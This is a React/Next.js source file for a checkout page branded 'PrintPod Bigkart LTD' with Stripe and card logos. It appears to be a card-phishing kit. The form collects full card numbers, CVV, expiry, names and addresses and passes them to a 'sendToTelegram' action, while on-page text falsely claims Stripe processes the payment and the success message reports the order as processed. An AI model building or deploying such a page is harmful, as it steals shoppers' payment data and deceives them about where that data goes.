"use client"

// eslint-disable-next-line @typescript-eslint/no-unused-vars
import { useState, useEffect, type FormEvent } from "react"

import Image from "next/image"
import { ArrowLeft, Lock, Minus, Plus } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Checkbox } from "@/components/ui/checkbox"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { cn } from "@/lib/utils"
import { sendToTelegram } from "@/app/actions/sendToTelegram"
import { useToast } from "@/hooks/use-toast"

function validateCardNumber(number: string) {
  number = number.replace(/\D/g, "")
  if (number.length < 13 || number.length > 19) return false
  let sum = 0
  let isEven = false
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = Number.parseInt(number.charAt(i), 10)
    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }
    sum += digit
    isEven = !isEven
  }
  return sum % 10 === 0
}

const usStates = [
  { value: "AL", label: "Alabama" },
  { value: "AK", label: "Alaska" },
  { value: "AZ", label: "Arizona" },
  { value: "AR", label: "Arkansas" },
  { value: "CA", label: "California" },
  { value: "CO", label: "Colorado" },
  { value: "CT", label: "Connecticut" },
  { value: "DE", label: "Delaware" },
  { value: "FL", label: "Florida" },
  { value: "GA", label: "Georgia" },
  { value: "HI", label: "Hawaii" },
  { value: "ID", label: "Idaho" },
  { value: "IL", label: "Illinois" },
  { value: "IN", label: "Indiana" },
  { value: "IA", label: "Iowa" },
  { value: "KS", label: "Kansas" },
  { value: "KY", label: "Kentucky" },
  { value: "LA", label: "Louisiana" },
  { value: "ME", label: "Maine" },
  { value: "MD", label: "Maryland" },
  { value: "MA", label: "Massachusetts" },
  { value: "MI", label: "Michigan" },
  { value: "MN", label: "Minnesota" },
  { value: "MS", label: "Mississippi" },
  { value: "MO", label: "Missouri" },
  { value: "MT", label: "Montana" },
  { value: "NE", label: "Nebraska" },
  { value: "NV", label: "Nevada" },
  { value: "NH", label: "New Hampshire" },
  { value: "NJ", label: "New Jersey" },
  { value: "NM", label: "New Mexico" },
  { value: "NY", label: "New York" },
  { value: "NC", label: "North Carolina" },
  { value: "ND", label: "North Dakota" },
  { value: "OH", label: "Ohio" },
  { value: "OK", label: "Oklahoma" },
  { value: "OR", label: "Oregon" },
  { value: "PA", label: "Pennsylvania" },
  { value: "RI", label: "Rhode Island" },
  { value: "SC", label: "South Carolina" },
  { value: "SD", label: "South Dakota" },
  { value: "TN", label: "Tennessee" },
  { value: "TX", label: "Texas" },
  { value: "UT", label: "Utah" },
  { value: "VT", label: "Vermont" },
  { value: "VA", label: "Virginia" },
  { value: "WA", label: "Washington" },
  { value: "WV", label: "West Virginia" },
  { value: "WI", label: "Wisconsin" },
  { value: "WY", label: "Wyoming" },
]

export default function EnhancedCheckoutPage() {
  const [isCardValid, setIsCardValid] = useState(true)
  const [quantity, setQuantity] = useState(1)
  const [useDifferentShipping, setUseDifferentShipping] = useState(false)
  const { toast } = useToast()

  const productPrice = 7.99
  const totalCost = productPrice * quantity

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    const formData = new FormData(event.currentTarget)
    formData.append("quantity", quantity.toString())
    formData.append("totalCost", totalCost.toFixed(2))
    const result = await sendToTelegram(formData)

    if (result.success) {
      toast({
        title: "Order Placed Successfully",
        description: "Your order has been processed successfully.",
      })
    } else {
      toast({
        title: "Order Failed",
        description: "There was an error processing your order. Please try again.",
        variant: "destructive",
      })
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center">
      <div className="max-w-[480px] w-full mx-auto p-6 bg-white rounded-xl shadow-lg">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="icon" className="rounded-full">
              <ArrowLeft className="h-4 w-4" />
            </Button>
            <div className="flex items-center gap-2">
              <Image
                src="https://i.ibb.co/2jZ34vq/Bigkart-1.png"
                alt="PrintPod Bigkart LTD"
                width={20}
                height={20}
                className="h-5 w-5 rounded"
              />
              <span className="text-sm font-medium">PrintPod Bigkart LTD</span>
            </div>
          </div>
          <div className="flex items-center gap-2 text-gray-400">
            <Image
              src="/placeholder.svg?height=20&width=60"
              alt="Stripe"
              width={60}
              height={20}
              className="h-5 w-auto"
            />
          </div>
        </div>

        {/* Product Info */}
        <div className="mb-8 flex items-center justify-between">
          <div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">Order summary</h2>
            <div className="text-sm">
              <div>Product cost: ${productPrice.toFixed(2)}</div>
              <div>Shipping charges: Free</div>
              <div className="font-medium">Subtotal: ${totalCost.toFixed(2)}</div>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <Image
              src="https://i.ibb.co/W0G17GZ/Product-Page7white.jpg"
              alt="Product"
              width={80}
              height={80}
              className="rounded-lg"
            />
            <div className="flex items-center gap-2">
              <Button variant="outline" size="icon" onClick={() => setQuantity(Math.max(1, quantity - 1))}>
                <Minus className="h-4 w-4" />
              </Button>
              <span className="w-8 text-center">{quantity}</span>
              <Button variant="outline" size="icon" onClick={() => setQuantity(quantity + 1)}>
                <Plus className="h-4 w-4" />
              </Button>
            </div>
          </div>
        </div>

        {/* Payment Form */}
        <form className="space-y-6" onSubmit={handleSubmit}>
          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email">Email</Label>
              <Input type="email" id="email" name="email" className="bg-white border-gray-300" required />
            </div>
            <div className="space-y-2">
              <Label htmlFor="phone">Phone Number</Label>
              <div className="flex">
                <Select name="countryCode" defaultValue="US">
                  <SelectTrigger className="w-[120px] bg-white border-gray-300">
                    <SelectValue placeholder="Country" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="US">🇺🇸 +1</SelectItem>
                    <SelectItem value="GB">🇬🇧 +44</SelectItem>
                    <SelectItem value="DE">🇩🇪 +49</SelectItem>
                    <SelectItem value="FR">🇫🇷 +33</SelectItem>
                    <SelectItem value="IT">🇮🇹 +39</SelectItem>
                    <SelectItem value="ES">🇪🇸 +34</SelectItem>
                  </SelectContent>
                </Select>
                <Input type="tel" id="phone" name="phone" className="flex-1 ml-2 bg-white border-gray-300" required />
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <h2 className="text-xl font-semibold">Payment Method</h2>
            <div className="space-y-2">
              <Label>Card details</Label>
              <div className="space-y-2">
                <div className="relative">
                  <Input
                    type="text"
                    placeholder="1234 1234 1234 1234"
                    name="cardNumber"
                    className={cn("bg-white border-gray-300", isCardValid ? "" : "border-red-500 focus:ring-red-500")}
                    onChange={(e) => {
                      const isValid = validateCardNumber(e.target.value)
                      setIsCardValid(isValid)
                    }}
                    required
                  />
                  <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
                    <Image
                      src="https://i.ibb.co/mBJkjWK/Visa-Logo-PNG.jpg"
                      alt="Visa"
                      width={36}
                      height={20}
                      className="h-5 w-9 object-contain"
                    />
                    <Image
                      src="https://i.ibb.co/kSW613X/pngegg.png"
                      alt="Mastercard"
                      width={36}
                      height={20}
                      className="h-5 w-9 object-contain"
                    />
                    <Image
                      src="https://i.ibb.co/2KTFCKT/pngwing-com.png"
                      alt="American Express"
                      width={36}
                      height={20}
                      className="h-5 w-9 object-contain"
                    />
                    <Image
                      src="https://i.ibb.co/L9CsxL5/pngwing-com-1.png"
                      alt="Union Pay"
                      width={36}
                      height={20}
                      className="h-5 w-9 object-contain"
                    />
                  </div>
                </div>
                <div className="grid grid-cols-3 gap-2">
                  <Select name="expiryMonth">
                    <SelectTrigger className="bg-white border-gray-300">
                      <SelectValue placeholder="MM" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                        <SelectItem key={month} value={month.toString().padStart(2, "0")}>
                          {month.toString().padStart(2, "0")}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Select name="expiryYear">
                    <SelectTrigger className="bg-white border-gray-300">
                      <SelectValue placeholder="YY" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 10 }, (_, i) => new Date().getFullYear() + i).map((year) => (
                        <SelectItem key={year} value={year.toString().slice(-2)}>
                          {year.toString().slice(-2)}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <div className="relative">
                    <Input type="text" placeholder="CVV" name="cvv" className="bg-white border-gray-300" required />
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      <Image
                        src="/placeholder.svg?height=16&width=16"
                        alt="CVV"
                        width={16}
                        height={16}
                        className="h-4 w-4 opacity-50"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="space-y-2">
              <Label htmlFor="name">Full name on card</Label>
              <Input
                type="text"
                id="name"
                name="cardholderName"
                placeholder="Full name on card"
                className="bg-white border-gray-300"
                required
              />
            </div>
            <div className="text-sm text-gray-600 flex items-center">
              <Lock className="w-4 h-4 mr-2" />
              All transactions are secure and encrypted
            </div>
          </div>

          <div className="space-y-4">
            <h2 className="text-xl font-semibold">Billing Information</h2>
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="billingFirstName">First Name</Label>
                <Input
                  type="text"
                  id="billingFirstName"
                  name="billingFirstName"
                  className="bg-white border-gray-300"
                  required
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="billingLastName">Last Name</Label>
                <Input
                  type="text"
                  id="billingLastName"
                  name="billingLastName"
                  className="bg-white border-gray-300"
                  required
                />
              </div>
            </div>
            <div className="space-y-2">
              <Label>Country or region</Label>
              <Select name="country" defaultValue="US">
                <SelectTrigger className="bg-white border-gray-300">
                  <SelectValue placeholder="Select country" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="US">United States</SelectItem>
                  <SelectItem value="CA">Canada</SelectItem>
                  <SelectItem value="GB">United Kingdom</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <Label htmlFor="address">Address</Label>
              <Input type="text" id="address" name="billingAddress" className="bg-white border-gray-300" required />
            </div>
            <div className="space-y-2">
              <Label htmlFor="apartment">Apartment (optional)</Label>
              <Input type="text" id="apartment" name="billingApartment" className="bg-white border-gray-300" />
            </div>
            <div className="grid grid-cols-2 gap-2">
              <div className="space-y-2">
                <Label htmlFor="city">City</Label>
                <Input type="text" id="city" name="billingCity" className="bg-white border-gray-300" required />
              </div>
              <div className="space-y-2">
                <Label htmlFor="state">State</Label>
                <Select name="billingState">
                  <SelectTrigger className="bg-white border-gray-300">
                    <SelectValue placeholder="Select state" />
                  </SelectTrigger>
                  <SelectContent>
                    {usStates.map((state) => (
                      <SelectItem key={state.value} value={state.value}>
                        {state.label}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>
            <div className="space-y-2">
              <Label htmlFor="zip">ZIP</Label>
              <Input type="text" id="zip" name="billingZip" className="bg-white border-gray-300" required />
            </div>
          </div>

          <div className="space-y-4">
            <h2 className="text-xl font-semibold">Shipping Options</h2>
            <div className="flex items-center space-x-2">
              <Checkbox
                id="sameAddress"
                name="sameAddress"
                defaultChecked={!useDifferentShipping}
                checked={!useDifferentShipping}
                onCheckedChange={(checked) => setUseDifferentShipping(!checked)}
              />
              <Label htmlFor="sameAddress">Use same address for shipping</Label>
            </div>
            <div className="flex items-center space-x-2">
              <Checkbox
                id="differentShipping"
                name="differentShipping"
                checked={useDifferentShipping}
                onCheckedChange={(checked) => {
                  setUseDifferentShipping(checked as boolean)
                  if (checked) {
                    document.getElementById("sameAddress")?.click()
                  }
                }}
              />
              <Label htmlFor="differentShipping">Use Different Shipping Address</Label>
            </div>
            {useDifferentShipping && (
              <div className="space-y-4 border-t pt-4">
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="shippingFirstName">First Name</Label>
                    <Input
                      type="text"
                      id="shippingFirstName"
                      name="shippingFirstName"
                      className="bg-white border-gray-300"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="shippingLastName">Last Name</Label>
                    <Input
                      type="text"
                      id="shippingLastName"
                      name="shippingLastName"
                      className="bg-white border-gray-300"
                      required
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label>Country or region</Label>
                  <Select name="shippingCountry" defaultValue="US">
                    <SelectTrigger className="bg-white border-gray-300">
                      <SelectValue placeholder="Select country" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="US">United States</SelectItem>
                      <SelectItem value="CA">Canada</SelectItem>
                      <SelectItem value="GB">United Kingdom</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="shippingAddress">Shipping Address</Label>
                  <Input type="text" id="shippingAddress" name="shippingAddress" className="bg-white border-gray-300" />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="shippingApartment">Apartment (optional)</Label>
                  <Input
                    type="text"
                    id="shippingApartment"
                    name="shippingApartment"
                    className="bg-white border-gray-300"
                  />
                </div>
                <div className="grid grid-cols-2 gap-2">
                  <div className="space-y-2">
                    <Label htmlFor="shippingCity">City</Label>
                    <Input type="text" id="shippingCity" name="shippingCity" className="bg-white border-gray-300" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="shippingState">State</Label>
                    <Select name="shippingState">
                      <SelectTrigger className="bg-white border-gray-300">
                        <SelectValue placeholder="Select state" />
                      </SelectTrigger>
                      <SelectContent>
                        {usStates.map((state) => (
                          <SelectItem key={state.value} value={state.value}>
                            {state.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="shippingZip">ZIP</Label>
                  <Input type="text" id="shippingZip" name="shippingZip" className="bg-white border-gray-300" />
                </div>
              </div>
            )}
          </div>

          <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white" size="lg">
            <Lock className="w-4 h-4 mr-2" />
            Pay ${totalCost.toFixed(2)}
          </Button>

          <div className="text-center text-sm text-gray-600 mt-4">
            <span className="inline-flex items-center">
              All transactions are securely encrypted and processed by Stripe
            </span>
          </div>

          <div className="flex items-center gap-2 border rounded-lg p-4 bg-green-50 border-green-200">
            <div className="h-5 w-5 bg-green-100 rounded-full flex items-center justify-center">
              <div className="h-3 w-3 bg-green-500 rounded-full" />
            </div>
            <p className="text-sm text-green-800">
              <span className="font-medium">PrintPod Bigkart LTD</span> will contribute{" "}
              <span className="font-medium">0.5% of your purchase</span> to removing CO<sub>2</sub> from the atmosphere.
            </p>
          </div>

          <div className="flex items-center justify-between text-xs text-gray-500">
            <div className="flex items-center gap-2">
              <span>Powered by</span>
              <Image
                src="https://i.ibb.co/313GGG3/ebf2f0588e962512eab4e9bc355d88a5.png"
                alt="Stripe"
                width={60}
                height={20}
                className="h-4 w-auto"
              />
            </div>
            <div className="flex gap-4">
              <a href="#" className="hover:text-gray-600">
                Terms
              </a>
              <a href="#" className="hover:text-gray-600">
                Privacy
              </a>
            </div>
          </div>
        </form>
      </div>
    </div>
  )
}

